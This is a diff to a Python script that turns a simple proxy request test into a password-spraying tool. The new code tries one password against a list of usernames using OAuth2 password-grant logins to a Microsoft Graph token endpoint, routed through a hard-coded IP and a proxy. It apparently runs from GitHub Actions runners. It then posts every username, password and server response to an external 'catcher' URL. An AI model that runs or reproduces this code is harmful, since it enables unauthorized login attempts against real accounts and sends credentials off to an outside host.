@@ -2,91 +2,78 @@ import requests
 import os
 from urllib3.exceptions import InsecureRequestWarning
 
-# Disable SSL warnings
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-
-# Validate required environment variables
-required_env_vars = ["CATCHERURL", "CATCHERTLS"]
+required_env_vars = ["USERNAMES", "PASSWORD", "CATCHERURL", "CATCHERTLS"]
 missing_env_vars = [var for var in required_env_vars if os.getenv(var) is None]
+
 if missing_env_vars:
     missing_vars_str = ", ".join(missing_env_vars)
     raise ValueError(f"Missing environment variables: {missing_vars_str}")
 
+# TODO: add target and other data here later to make this more modular
 # Fetch environment variables
+usernames = os.getenv("USERNAMES").split(',')
+password = os.getenv("PASSWORD")
 catcher_URL = os.getenv("CATCHERURL")
-catcher_uses_TLS = os.getenv("CATCHERTLS").lower() == "true"
-instance_id = os.getenv("INSTANCE_ID", "1")
+catcher_uses_TLS_str = os.getenv("CATCHERTLS")
+# Convert catcher_uses_TLS_str to boolean
+catcher_uses_TLS = catcher_uses_TLS_str.lower() == "true"
 
-# Configure prox
-
-print(f"[*] Instance ID: {instance_id}")
-
-def send_request():
-    """Send a single GET request through the proxy"""
-    url = "https://ja4db.com/id/ja4/"
-    headers = {
+def send_login_request(username, password):
+    url = "http://18.234.239.10:8888/common/oauth2/token"
+    body_params = {
+        "resource": "https://graph.windows.net",
+        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
+        "client_info": "1",
+        "grant_type": "password",
+        "username": username,
+        "password": password,
+        "scope": "openid",
+    }
+    post_headers = {
         "Accept": "application/json",
         "Content-Type": "application/x-www-form-urlencoded",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36.",
     }
-    
+
     try:
-        print(f"[*] Sending request to {url}")
-        response = requests.get(
+        response = requests.post(
             url,
-            headers=headers,
-            proxies = {"http": "http://changeme:changeme@127.0.0.1:1234"},
-            verify=False,
-            timeout=30,
+            headers=post_headers,
+            data=body_params,
+            proxies={"http": "http://changeme:changeme@127.0.0.1:1234"},
+            timeout=5,
         )
-        
-        print(f"[+] Response received: {response.status_code}")
-        return response
-        
-    except requests.RequestException as e:
-        print(f"[-] Request failed: {str(e)}")
-        return None
+        return response.status_code, response.text
 
-def send_data_to_catcher(data):
-    """Send data to the catcher via GET request"""
+    except requests.RequestException:
+        return None, None
+
+def send_data_to_catcher(data, use_ssl):
+    if not use_ssl:
+        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
     try:
-        print(f"[*] Fetching logs from catcher: {catcher_URL}")
-        response = requests.get(
-            catcher_URL,
-            timeout=10,
-            verify=catcher_uses_TLS
-        )
-        print(f"[+] Catcher response received")
-        print(response.text)
+        response = requests.post(catcher_URL, json=data, timeout=3, verify=use_ssl)
+        print("[+] Data sent to the catcher.")
+    except requests.RequestException:
+        print(f"[-] Failed to send data to the catcher.")
         
-    except requests.RequestException as e:
-        print(f"[-] Failed to fetch from catcher: {str(e)}")
+# Initialize an empty list to store results
+results = []
 
-# Send the request
-response = send_request()
+# Iterate over each username and perform login request
+for username in usernames:
+    login_response_code, login_response = send_login_request(username, password)
+    result = {
+        "username": username,
+        "password": password,
+    }
+    if login_response_code is not None and login_response is not None:
+        result["status_code"] = login_response_code
+        result["response"] = login_response
+    else:
+        result["status_code"] = 500
+        result["response"] = "Github actions workflow failed to perform login request"
+    results.append(result)
 
-result = {
-    "instance_id": instance_id,
-}
-
-if response is not None:
-    result["status_code"] = response.status_code
-    result["response_body"] = response.text
-    result["response_headers"] = dict(response.headers)
-    result["url"] = response.url
-    result["elapsed_time"] = str(response.elapsed)
-    
-    # Try to parse JSON if possible
-    try:
-        result["response_json"] = response.json()
-    except:
-        result["response_json"] = None
-else:
-    result["status_code"] = 500
-    result["response_body"] = "Request failed"
-    result["response_headers"] = {}
-
-# Fetch logs from catcher
-print(f"\n[*] Fetching logs from catcher...")
-send_data_to_catcher(result)
-print("[*] Script completed!")
+# Send all results to the catcher
+send_data_to_catcher(results, use_ssl=catcher_uses_TLS)
